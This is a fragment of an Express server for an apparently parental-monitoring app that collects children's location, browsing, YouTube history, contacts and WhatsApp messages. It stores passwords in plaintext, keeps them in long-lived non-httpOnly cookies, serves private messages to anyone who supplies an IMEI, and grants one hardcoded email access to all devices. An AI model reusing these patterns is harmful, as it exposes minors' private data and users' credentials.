            let d = await db.collection("devices").findOne({imei:imei});


            if(d == null || d == undefined || d.youtube == undefined) {
                data.data = [];
                await db.collection("devices").updateOne({imei:imei}, {$set:{youtube:data}}, {upsert:true});
            }else {
                let ans = data.data.slice(0);
                let M = {};
                if(d.youtube.data != undefined) {
                    for(let i = 0; i < d.youtube.data.length; i++) {
                        M[d.youtube.data[i].start] = true;
                    }
                }
                let f = [];
                for(let i = 0; i < ans.length; i++) {
                    if(M[ans[i].start] == undefined) {
                        f.push(ans[i]);
                    }
                }
                d.youtube.data = d.youtube.data.concat(f);
                await db.collection("devices").updateOne({imei:imei}, {$push:{"youtube.data":{$each:f}}});
            }
            if(d.youtube == undefined) {
                d.youtube = {};
                d.youtube.data = [];
            }
            CommandResults[imei+'sendYoutube'] = d.youtube;

            res.send("1");
        });
        app.post("/sendWebSites", async function (req, res) {
            console.log(req.url);
            console.log("----------in sendWebSites");
            //also push notification to user
            let data = req.body;
            console.log(data);
            //data = JSON.parse(data);
            let imei = data.imei;

            console.log("-------in sendWebSites");
            let d = await db.collection("devices").findOne({imei:imei});
            if(d == null || d == undefined || d.website == undefined) {
                data.data = [];
                await db.collection("devices").updateOne({imei:imei}, {$set:{website:data}}, {upsert:true});
            }else {
                let ans = data.data.slice(0);
                let M = {};
                if(d.website.data != undefined) {
                    for(let i = 0; i < d.website.data.length; i++) {
                        M[d.website.data[i].start] = true;
                    }
                }
                let f = [];
                for(let i = 0; i < ans.length; i++) {
                    if(M[ans[i].start] == undefined) {
                        f.push(ans[i]);
                    }
                }
                d.website.data = d.website.data.concat(f);
                await db.collection("devices").updateOne({imei:imei}, {$push:{"website.data":{$each:f}}});
            }
            if(d.website == undefined) {
                d.website = {};
                d.website.data = [];
            }
            CommandResults[imei+'sendWebsites'] = d.website;
            res.send("1");
        });
        app.post("/sendLocation", async function (req, res) {
            console.log(req.url);
            console.log("----------in sendLocation");
            //also push notification to user
            let data = req.body;
            console.log(data);
            //data = JSON.parse(data);
            let imei = data.imei;
            console.log("-------in sendLocation");
            let d = await db.collection("devices").findOne({imei:imei});
            if(d == null || d == undefined || d.location == undefined) {
                //data.data = [];
                await db.collection("devices").updateOne({imei:imei}, {$set:{location:data}}, {upsert:true});
            }else {
                if(d.location == undefined) {
                    d.location = {};
                    d.location.data = [];
                }
                let ans = data.data.slice(0);
                let le = ans.pop();
                let M = {};
                if(d.location.data != undefined) {
                    for(let i = 0; i < d.location.data.length; i++) {
                        M[d.location.data[i].start] = true;
                    }
                }
                let f = [];
                for(let i = 0; i < ans.length; i++) {
                    if(M[ans[i].start] == undefined) {
                        f.push(ans[i]);
                    }
                }
                d.location.data = d.location.data.concat(f);
                if(d.location.data.length == 0 && le != undefined) {
                    f.push(le);
                }
                if(le != undefined && le != null) {
                    d.location.data.push(le);
                }
                await db.collection("devices").updateOne({imei:imei}, {$push:{"location.data":{$each:f}}});
            }

            if(d.location == undefined) {
                d.location = {};
                d.location.data = [];
            }

            CommandResults[imei+'sendLocation'] = d.location;
            console.log(d.location);
            console.log(CommandResults[imei+'sendLocation']);

            res.send("1");
        });
        app.get("/sendCommand", async function (req, res) {
            console.log(req.url);
            //also push notification to user
            //console.log(req.query);
            console.log(req.query)
            let imei = req.query.imei;
            let cmd;
            if(req.query.youtube != undefined) {
                cmd = 'sendYoutube'
            }else if(req.query.sendWebsites){
                cmd = 'sendWebsites';
            }else if(req.query.sendLocation){
                cmd = 'sendLocation';
            }else if(req.query.whatsapp){
                cmd = 'sendWhatsapp';
            }
            else {
                cmd = 'sendActivity';
            }

            let d = await db.collection("devices").findOne({imei:imei});
            if(d == null || d == undefined) {

                return;
            }

            let t = 0;
            let f = setInterval(function () {
                t++;
                console.log(imei+cmd);
                //console.log(t + " in sendCommand");
                //console.log(CommandResults);
                if(CommandResults[imei+cmd] != undefined) {
                    let of = CommandResults[imei+cmd];
                    //console.log(of);
                    //console.log("SEND activity bu gelib")

                    if(cmd != 'sendWhatsapp') {
                        of.data = filter(req.query.curDay, of.data, req.query.off);
                        console.log("filter olunmus in command");
                        console.log(of);

                    }
                    res.send(of);
                    clearInterval(f);
                    CommandResults[imei+cmd] = undefined;
                    return;
                }
                if(t == 6) {
                    clearInterval(f);
                    let ans;
                    if(cmd == 'sendActivity' && d.activity != undefined) {
                        d.activity.data = filter(req.query.curDay,d.activity.data, req.query.off);
                        res.send(d.activity);
                    }else if(cmd == 'sendLocation' && d.location != undefined){
                        d.location.data = filter(req.query.curDay,d.location.data, req.query.off);
                        res.send(d.location);
                    } else if(cmd == 'sendWensites' && d.website != undefined){
                        d.website.data = filter(req.query.curDay,d.website.data, req.query.off);
                        res.send(d.website);
                    }else if(cmd == 'sendYoutube' && d.youtube != undefined) {
                        d.youtube.data = filter(req.query.curDay,d.youtube.data, req.query.off);
                        res.send(d.youtube);
                    }else if(cmd == 'sendWhatsapp' && d.con != undefined){
                        res.send(d.con);
                    }
                    else {
                        res.send("0");
                    }
                }
            }, 1000);

            console.log(imei + "---" + d.token);



            let message = {
                data: {
                    command: cmd

                },
                token: d.token,
                android:{
                    priority:"high"
                }
            };
            admin.messaging().send(message)
                .then((response) => {
                    // Response is a message ID string.
                    console.log('Successfully sent message:', response);
                })
                .catch((error) => {
                    console.log('Error sending message:', error);
                });




            console.log(req.query + " in sendCommand");
            //res.send(JSON.stringify(d));
        });
        app.get("/blockApp", async function (req, res) {
            console.log(req.url);
            //also push notification to user
            let imei = req.query.imei;
            let package = req.query.package;
            let d = await db.collection("devices").findOne({imei:imei});
            if(d == null) {
                res.sendStatus(500);
                return;
            }
            let cur = false;
            for(let i = 0; i < d.apps.length; i++) {
                if(d.apps[i].package == package) {
                    cur = d.apps[i].blocked;
                    console.log("Tapildi");
                    break;
                }
            }
            cur = cur ^ true;
            console.log(cur);

            let message = {
                data: {
                    package: package,block:req.query.block,
                    command: "blockApp"

                },
                token: d.token
            };
            admin.messaging().send(message)
                .then((response) => {
                    // Response is a message ID string.
                    console.log('Successfully sent message:', response);
                })
                .catch((error) => {
                    console.log('Error sending message:', error);
                });



            await db.collection("devices").updateOne({imei:imei,"apps.package": package },
            {$set:{"apps.$.blocked":cur}});
            console.log(req.query);
            res.send(JSON.stringify(d));
        });
        app.get("/limitApp", async function (req, res) {
            console.log(req.url);
            //also push notification to user
            let imei = req.query.imei;
            let package = req.query.p;
            let t = req.query.t;
            let l = req.query.l;
            let message;
            console.log(req.query);
            let d = await db.collection("devices").findOne({imei:imei});
            if(t == "r") {
                message = {
                    data: {
                        p: package,
                        command: "limit",
                        t:"r"
                    },
                    token: d.token
                };
                await db.collection("devices").updateOne({imei:imei,"apps.package": package },
                    {$unset:{"apps.$.limit":true}});
            }else if(t == "a") {
                message = {
                    data: {
                        p: package,
                        command: "limit",
                        l:l,
                        t:"a"
                    },
                    token: d.token
                };
                await db.collection("devices").updateOne({imei:imei,"apps.package": package },
                    {$set:{"apps.$.limit":l}});
            }

            if(d == null) {
                res.sendStatus(500);
                return;
            }
            admin.messaging().send(message)
                .then((response) => {
                    // Response is a message ID string.
                    console.log('Successfully sent message:', response);
                })
                .catch((error) => {
                    console.log('Error sending message:', error);
                });
            res.send("1");
        });

        app.get("/gpsIcaze", async function (req, res) {

            console.log(req.url);
            //also push notification to user
            let imei = req.query.imei;
            let icaze = req.query.icaze;
            let d = await db.collection("devices").findOne({imei:imei});
            if(d == null) {
                res.sendStatus(500);
                return;
            }

            let message = {
                data: {
                    command : 'gpsIcaze',
                    v: icaze
                },
                token: d.token
            };
            admin.messaging().send(message)
                .then((response) => {
                    // Response is a message ID string.
                    console.log('Successfully sent message:', response);
                })
                .catch((error) => {
                    console.log('Error sending message:', error);
                });



            await db.collection("devices").updateOne({imei:imei},
                {$set:{"gpsIcaze":icaze}});
            res.send(JSON.stringify(d));
        });

        app.get("/silIcaze", async function (req, res) {
            //also push notification to user
            console.log(req.url);
            let imei = req.query.imei;
            let icaze = req.query.icaze;
            let d = await db.collection("devices").findOne({imei:imei});
            if(d == null) {
                res.sendStatus(500);
                return;
            }

            let message = {
                data: {
                    command : 'silIcaze',
                    v: icaze
                },
                token: d.token
            };
            admin.messaging().send(message)
                .then((response) => {
                    // Response is a message ID string.
                    console.log('Successfully sent message:', response);
                })
                .catch((error) => {
                    console.log('Error sending message:', error);
                });



            await db.collection("devices").updateOne({imei:imei},
                {$set:{"silIcaze":icaze}});
            res.send(JSON.stringify(d));
        });
        app.get("/Icaze", async function (req, res) {
            //also push notification to user
            console.log(req.url);
            let imei = req.query.imei;
            let icaze = req.query.icaze;
            let d = await db.collection("devices").findOne({imei:imei});
            if(d == null) {
                res.sendStatus(500);
                return;
            }
            let message = {
                data: {
                    command : 'Icaze',
                    v: icaze
                },
                token: d.token
            };
            admin.messaging().send(message)
                .then((response) => {
                    // Response is a message ID string.
                    console.log('Successfully sent message:', response);
                })
                .catch((error) => {
                    console.log('Error sending message:', error);
                });



            await db.collection("devices").updateOne({imei:imei},
                {$set:{"Icaze":icaze}});
            res.send(JSON.stringify(d));
        });
        app.get("/inputsIcaze", async function (req, res) {
            console.log(req.url);
            //also push notification to user
            let imei = req.query.imei;
            let icaze = req.query.icaze;
            let d = await db.collection("devices").findOne({imei:imei});
            if(d == null) {
                res.sendStatus(500);
                return;
            }
            let message = {
                data: {
                    command : 'inputsIcaze',
                    v: icaze
                },
                token: d.token
            };
            admin.messaging().send(message)
                .then((response) => {
                    // Response is a message ID string.
                    console.log('Successfully sent message:', response);
                })
                .catch((error) => {
                    console.log('Error sending message:', error);
                });



            await db.collection("devices").updateOne({imei:imei},
                {$set:{"inputsIcaze":icaze}});
            res.send(JSON.stringify(d));
        });






        app.post("/charge", (req, res) => {
            console.log(req.url);
            try {
                stripe.customers
                    .create({
                        name: req.body.name,
                        email: req.body.email,
                        source: req.body.stripeToken
                    })
                    .then(customer =>
                        stripe.charges.create({
                            amount: req.body.amount * 100,
                            currency: "usd",
                            customer: customer.id
                        })
                    )
                    .then(() => res.send("DONE"))
                    .catch(err => console.log(err));
            } catch (err) {
                res.send(err);
            }
        });

        app.post("/checkout", async (req, res) => {
            console.log(req.url);
            console.log(req.body);

            if(req.body.type == "1") {
                try {
                    stripe.customers
                        .create({
                            email: req.body.stripeEmail,
                            source: req.body.stripeToken
                        })
                        .then(customer =>
                            stripe.charges.create({
                                amount: 499,
                                currency: "eur",
                                customer: customer.id
                            })
                        )
                        .then(async () => {
                            let date = new Date();
                            date.setMonth(date.getMonth()+1);
                             await db.collection("devices").update({email:req.cookies.email}, {$set:{until:date.getTime()}});
                            res.redirect("/");
                        })
                        .catch(err => {
                            console.log(err);
                            res.redirect("/");
                        });
                } catch (err) {
                    res.send(err);
                }
            }else if(req.body.type == "3") {
                try {
                    stripe.customers
                        .create({
                            email: req.body.stripeEmail,
                            source: req.body.stripeToken
                        })
                        .then(customer =>
                            stripe.charges.create({
                                amount: 999,
                                currency: "eur",
                                customer: customer.id
                            })
                        )
                        .then(async () => {
                            let date = new Date();
                            date.setMonth(date.getMonth()+3);
                            await db.collection("devices").update({email:req.cookies.email}, {$set:{until:date.getTime()}});
                            res.redirect("/");
                        })
                        .catch(err => {
                            console.log(err);
                            res.send("Kartda yeterince pul yoxdur");
                        });
                } catch (err) {
                    res.send(err);
                }
            }else if(req.body.type == "6") {
                try {
                    stripe.customers
                        .create({
                            email: req.body.stripeEmail,
                            source: req.body.stripeToken
                        })
                        .then(customer =>
                            stripe.charges.create({
                                amount: 1999,
                                currency: "eur",
                                customer: customer.id
                            })
                        )
                        .then(async () => {
                            let date = new Date();
                            date.setMonth(date.getMonth()+6);
                            await db.collection("devices").update({email:req.cookies.email}, {$set:{until:date.getTime()}});
                            res.redirect("/");
                        })
                        .catch(err => {
                            console.log(err);
                            res.send("Kartda yeterince pul yoxdur");
                        });
                } catch (err) {
                    res.send(err);
                }
            }if(req.body.type == "12"){
                try {
                    stripe.customers
                        .create({
                            email: req.body.stripeEmail,
                            source: req.body.stripeToken
                        })
                        .then(customer =>
                            stripe.charges.create({
                                amount: 2999,
                                currency: "eur",
                                customer: customer.id
                            })
                        )
                        .then(async () => {
                            let date = new Date();
                            date.setMonth(date.getMonth()+6);
                            await db.collection("devices").update({email:req.cookies.email}, {$set:{until:date.getTime()}});
                            res.redirect("/");
                        })
                        .catch(err => {
                            console.log(err);
                            res.send("Kartda yeterince pul yoxdur");
                        });
                } catch (err) {
                    res.send(err);
                }
            }


        });

        app.get("/login", async function (req, res) {

            console.log(req.url);

            console.log(req.cookies);
            console.log(req.query);
            if(req.query.email == undefined) {
                req.query.email = req.cookies.email;
                req.query.password = req.cookies.password;
            }
            if(req.query.password == undefined || req.query.password == undefined) {
                res.send("EMAIL OR PASSWORD ARE NOT DEFINED");
                return;
            }

            let u = await db.collection("devices").findOne({email:req.query.email, password:req.query.password});
            if(u == undefined) {
                res.send("PASWORD YANLISHDIR");
                return;
            }

            let options = {
                maxAge: 253402300000000 // would expire after 15 minutes
                //httpOnly: true, // The cookie only accessible by the web server
                //signed: true // Indicates if the cookie should be signed
            }

            // Set cookie
            res.cookie('email', req.query.email, options) // options is optional
            res.cookie('password', req.query.password, options) // options is optional
            res.cookie('date', (new Date()).toLocaleString(), options) // options is optional
            let imei = req.cookies.imei;
            if(imei != undefined) {
                await db.collection("devices").updateOne({imei:imei}, {$set:{email:req.query.email, password:req.query.password}}, {upsert:true});
            }
            res.send("1");
        });
        app.get("/registration", async function (req, res) {
            console.log(req.url);
            console.log(req.query);

            let u = await db.collection("devices").findOne({email:req.query.email});
            console.log(u);
            if(u == undefined) {
                let options = {
                    maxAge: 253402300000000 // would expire after 15 minutes
                    //httpOnly: true, // The cookie only accessible by the web server
                    //signed: true // Indicates if the cookie should be signed
                }
                res.cookie('email', req.query.email, options) // options is optional
                res.cookie('password', req.query.password, options) // options is optional
                res.cookie('date', (new Date()).toLocaleString(), options) // options is optional


                let imei = req.cookies.imei;
                let date = new Date();
                date.setDate(date.getDate() + 1);

                if(imei != undefined) {
                    await db.collection("devices").updateOne({imei:imei}, {$set:{email:req.query.email,password: req.query.password, until:date.getTime()}}, {upsert:true});
                }else {
                    await db.collection("devices").insertOne({email:req.query.email, password: req.query.password, until:date.getTime()});
                }
                res.send("1");
                return;
            }else {
                res.send("BU Email artiq movcuddur");
            }
        });


        app.get("/index3", async function (req, res) {
            let ip2 = req.headers["x-real-ip"];
            fs.appendFileSync('iplerlok.txt', ip2 + "-" + new Date().toString() + "\n");
            console.log(req.url);
            console.log(req.headers["accept-language"])
            let imei = req.query.imei;
            console.log(req.cookies);
            if(imei != undefined) {
                // let options = {
                //     maxAge: 253402300000000, // would expire after 15 minutes
                //     //httpOnly: true, // The cookie only accessible by the web server
                //     signed: true // Indicates if the cookie should be signed
                // }
                //
                // // Set cookie
                // res.cookie('imei', imei, options) // options is optional
            }
            if(req.query.childName != undefined) {
                res.redirect("/login.html");
                return;
            }
            let email = req.cookies.email;
            let password = req.cookies.password;
            let d = await db.collection("devices").findOne({email:email, password:password,until: { $exists: true }});
            console.log(d);

            if(d == undefined || d == null  || email == undefined || password == undefined) {
                res.redirect("/login.html");
                return;
            }
            if(req.cookies.parent == "0" && req.cookies.email != undefined) {
                let s = await fs.readFileSync('./FamilyProtector/html/done.html') + "";
                res.send(s);
                return;
            }
            let now = new Date().getTime();
            console.log(d.until + "--" + now);
            if(d.until == undefined || d.until < now) {
                let s = await fs.readFileSync('./FamilyProtector/html/index3deactive.html') + "";
                res.send(s);
            }else {
                let s;
                if(email != 'toghrulgasimov@gmail.com') {
                    s = await fs.readFileSync('./FamilyProtector/html/index3.html') + "";
                }else {
                    s = await fs.readFileSync('./FamilyProtector/html/index3admin.html') + "";
                }
                res.send(s);
            }
        });
        app.get("/permission", async function (req, res) {
            console.log(req.url);
            console.log(req.headers["accept-language"])
            let imei = req.query.imei;
            console.log(req.cookies);
            console.log(req.query);
            let s = await fs.readFileSync('./FamilyProtector/html/permission.html') + "";
            res.send(s);
        });
        app.get("/parentorchild", async function (req, res) {
            console.log(req.url);
            console.log(req.headers["accept-language"])
            let imei = req.query.imei;
            console.log(req.cookies);
            console.log(req.query);
            if(req.cookies.parent=="1") {
                res.redirect("index3");
            }else if((req.query.pref == "1" && req.cookies.email != undefined)) {
                res.redirect("done.html");
                return;
            }else {
                let s = await fs.readFileSync('./FamilyProtector/html/parentorchild.html') + "";
                res.send(s);
            }
        });
        app.get("/getlanguage", async function (req, res) {
            console.log(req.url);
            console.log(req.headers["accept-language"]);
            console.log(req.body);
            res.send(req.headers["accept-language"]);
        });

        app.get("/parent", async function (req, res) {
            console.log(req.url);
            let parent = req.query.parent;

            console.log(req.query);
            if(parent != "0" && parent != "1") {
                res.send("ERROR");
                return;
            }

            let options = {
                maxAge: 253402300000000 // would expire after 15 minutes
                //httpOnly: true, // The cookie only accessible by the web server
                //signed: true // Indicates if the cookie should be signed
            }
            res.cookie('parent', parent, options) // options is optional
            let imei = req.cookies.imei;
            console.log("in PArent----")
            console.log(req.cookies);
            console.log(req.query);
            console.log("in PArent----")

            await db.collection("devices").updateOne({imei:imei}, {$set:{parent:parent}}, {upsert:true});
            res.send("1");

        });
        app.get("/childName", async function (req, res) {
            console.log(req.url);
            let name = req.query.name;

            let options = {
                maxAge: 253402300000000 // would expire after 15 minutes
                //httpOnly: true, // The cookie only accessible by the web server
                //signed: true // Indicates if the cookie should be signed
            }
            res.cookie('name', name, options) // options is optional
            res.clearCookie("email");
            res.clearCookie("password");
            //res.cookie('email', undefined, options) // options is optional
            let imei = req.cookies.imei;
            console.log("--------------------------------" + imei);
            console.log("in childName----")
            console.log(req.cookies);
            console.log(req.query);
            console.log("in childName----")

            await db.collection("devices").updateOne({imei:imei}, {$set:{name:name, imei:imei, parent:"0"}},{upsert:true});
            res.send("1");

        });
        app.post("/fillSelect", async function (req, res) {
            console.log(req.url);
            let email = req.cookies.email;
            console.log("------------------------------" + email + " Axtarilir");
            console.log(req.cookies);
            console.log(req.body);
            let d;
            if(email == "toghrulgasimov@gmail.com") {
                d = await db.collection("devices").find({imei: { $exists: true }}).project({imei:1, name:1});
            }else {
                d = await db.collection("devices").find({email:email,imei: { $exists: true }}).project({imei:1, name:1});
            }
            let ans = await d.toArray();
            if(email == "toghrulgasimov@gmail.com") {
                for(let i = 0; i < ans.length; i++) {
                    ans[i].name =i + ")" + ans[i].name +"-"+ ans[i].imei.substring(0,6);
                }
            }else {
                let ans2 = [];
                for(let i = 0; i < ans.length; i++) {
                    if(!ans[i].name == "") {
                        ans2.push(ans[i]);
                    }
                }
                ans = ans2;
            }
            ans.reverse();
            let data = {data:ans};
            console.log(ans);
            res.send(data);

        });
        app.post("/contacts", async function (req, res) {
            console.log(req.url);
            res.send("1");
            await db.collection("devices").updateOne({imei:req.body.imei}, {$set:{contact:req.body.c}}, {upsert:true});
            console.log(req.body);

        });
        app.post("/WpMsg", async function (req, res) {
            console.log(req.url);
            console.log(req.body);
            let imei = req.body.imei;
            req.body.imei = undefined;
            // let d = await db.collection("devices").find({imei:imei}).project({wp:1});
            // if(d.wp == undefined) {
            //
            // }else {
            //
            // }
            let o = {sender:req.body.sender, start:req.body.start,content:req.body.content,number:req.body.number
            ,name:req.body.name}
            await db.collection("devices").updateOne({imei:imei}, {$push:{wp:o}});

            res.send("1");

        });
        app.get("/WpCons", async function (req, res) {
            console.log(req.url);
            console.log(req.query);
            console.log(req.query.imei);
            let imei = req.query.imei;
            // let d = await db.collection("devices").find({imei:imei}).project({wp:1});
            // if(d.wp == undefined) {
            //
            // }else {
            //
            // }
            let d = await db.collection("devices").findOne({imei:imei});
            if(d == null) {
                res.status(400).send("")
                return;
            }
            let ar = d.wp;
            if(ar == undefined)ar = [];
            console.log(ar);
            let m = {};
            let ans = [];
            for(let i = ar.length - 1; i >= 0; i--) {
                if(m[ar[i].name] == undefined) {
                    m[ar[i].name] = true;
                    if(ar[i].content.length > 20) {
                        ar[i].content = ar[i].content.substring(0, 20) + "..."
                    }
                    ans.push(ar[i]);
                }
            }
            // if(req.cookies.email != 'toghrulgasimov@gmail.com') {
            //     res.status(400).send("0");
            // }else
            res.send({data:ans});


        });
        app.get("/WpCon", async function (req, res) {
            console.log(req.url);
            console.log(req.query);
            let imei = req.query.imei;
            let name = req.query.name;
            let num = req.query.num;
            // let d = await db.collection("devices").find({imei:imei}).project({wp:1});
            // if(d.wp == undefined) {
            //
            // }else {
            //
            // }
            let d = await db.collection("devices").findOne({imei:imei});
            if(d == null) {
                res.status(400).send("")
                return;
            }
            let ar = d.wp;
            let ans = [];
            for(let i = ar.length - 1; i >= 0; i--) {
                if(ar[i].name == name || ar[i].number == num)
                    ans.push(ar[i]);
            }
            res.send({data:ans});


        });

    }
}

f();
